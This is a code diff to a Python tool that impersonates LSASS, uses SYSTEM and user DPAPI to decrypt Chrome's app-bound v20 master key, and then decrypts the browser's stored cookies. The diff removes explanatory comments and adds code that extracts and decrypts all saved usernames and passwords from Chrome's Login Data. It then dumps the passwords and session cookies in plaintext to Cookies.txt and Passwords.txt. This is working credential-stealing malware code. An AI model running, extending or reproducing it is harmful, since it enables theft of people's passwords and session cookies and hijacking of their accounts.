@@ -51,14 +51,10 @@ def parse_key_blob(blob_data: bytes) -> dict:
     parsed_data['flag'] = buffer.read(1)[0]
     
     if parsed_data['flag'] == 1 or parsed_data['flag'] == 2:
-        # [flag|iv|ciphertext|tag] decrypted_blob
-        # [1byte|12bytes|32bytes|16bytes]
         parsed_data['iv'] = buffer.read(12)
         parsed_data['ciphertext'] = buffer.read(32)
         parsed_data['tag'] = buffer.read(16)
     elif parsed_data['flag'] == 3:
-        # [flag|encrypted_aes_key|iv|ciphertext|tag] decrypted_blob
-        # [1byte|32bytes|12bytes|32bytes|16bytes]
         parsed_data['encrypted_aes_key'] = buffer.read(32)
         parsed_data['iv'] = buffer.read(12)
         parsed_data['ciphertext'] = buffer.read(32)
@@ -91,7 +87,7 @@ def decrypt_with_cng(input_data):
         None,
         0,
         ctypes.byref(pcbResult),
-        0x40   # NCRYPT_SILENT_FLAG
+        0x40   
     )
     assert status == 0, f"1st NCryptDecrypt failed with status {status}"
 
@@ -106,7 +102,7 @@ def decrypt_with_cng(input_data):
         output_buffer,
         buffer_size,
         ctypes.byref(pcbResult),
-        0x40   # NCRYPT_SILENT_FLAG
+        0x40  
     )
     assert status == 0, f"2nd NCryptDecrypt failed with status {status}"
 
@@ -135,12 +131,11 @@ def derive_v20_master_key(parsed_data: dict) -> bytes:
     return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
 
 def main():
-    # chrome data path
     user_profile = os.environ['USERPROFILE']
     local_state_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State"
     cookie_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
+    login_db_path = rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    
-    # Read Local State
     with open(local_state_path, "r", encoding="utf-8") as f:
         local_state = json.load(f)
 
@@ -148,29 +143,21 @@ def main():
     assert(binascii.a2b_base64(app_bound_encrypted_key)[:4] == b"APPB")
     key_blob_encrypted = binascii.a2b_base64(app_bound_encrypted_key)[4:]
     
-    # Decrypt with SYSTEM DPAPI
     with impersonate_lsass():
         key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
 
-    # Decrypt with user DPAPI
     key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
     
-    # Parse key blob
     parsed_data = parse_key_blob(key_blob_user_decrypted)
     v20_master_key = derive_v20_master_key(parsed_data)
 
-    # v20 key decrypt test
-    # fetch all v20 cookies
+    # --- COOKIES ---
     con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
     cur = con.cursor()
-    r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
-    cookies = cur.fetchall()
+    cookies = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;").fetchall()
     cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
     con.close()
-
-    # decrypt v20 cookie with AES256GCM
-    # [flag|iv|ciphertext|tag] encrypted_value
-    # [3bytes|12bytes|variable|16bytes]
+    
     def decrypt_cookie_v20(encrypted_value):
         cookie_iv = encrypted_value[3:3+12]
         encrypted_cookie = encrypted_value[3+12:-16]
@@ -179,8 +166,50 @@ def main():
         decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
         return decrypted_cookie[32:].decode('utf-8')
 
+    cookies_dict = {}
     for c in cookies_v20:
-        print(c[0], c[1], decrypt_cookie_v20(c[2]))
+        domain, name, encrypted_value = c
+        value = decrypt_cookie_v20(encrypted_value)
+        if domain not in cookies_dict:
+            cookies_dict[domain] = []
+        cookies_dict[domain].append((name, value))
+
+    with open("Cookies.txt", "w", encoding="utf-8") as f:
+        for domain, cookie_list in cookies_dict.items():
+            f.write(f"Domain: {domain}\n")
+            for name, value in cookie_list:
+                f.write(f"    {name} = {value}\n")
+            f.write("\n")
+
+    # --- PASSWORDS ---
+    con = sqlite3.connect(pathlib.Path(login_db_path).as_uri() + "?mode=ro", uri=True)
+    cur = con.cursor()
+    logins = cur.execute("SELECT origin_url, username_value, password_value FROM logins;").fetchall()
+    con.close()
+
+    passwords_dict = {}
+    for origin_url, username, encrypted_password in logins:
+        if not username:
+            continue
+        if origin_url not in passwords_dict:
+            passwords_dict[origin_url] = []
+        try:
+            password_iv = encrypted_password[3:3+12]
+            encrypted_pass = encrypted_password[3+12:-16]
+            password_tag = encrypted_password[-16:]
+            cipher = AES.new(v20_master_key, AES.MODE_GCM, nonce=password_iv)
+            decrypted_password = cipher.decrypt_and_verify(encrypted_pass, password_tag).decode('utf-8')[32:]
+        except Exception:
+            decrypted_password = "<FAILED_TO_DECRYPT>"
+        passwords_dict[origin_url].append((username, decrypted_password))
+
+    with open("Passwords.txt", "w", encoding="utf-8") as f:
+        for domain, credentials in passwords_dict.items():
+            f.write(f"Domain: {domain}\n")
+            for username, password in credentials:
+                f.write(f"    username = {username}\n")
+                f.write(f"    password = {password}\n")
+            f.write("\n")
 
 if __name__ == "__main__":
     if not is_admin():
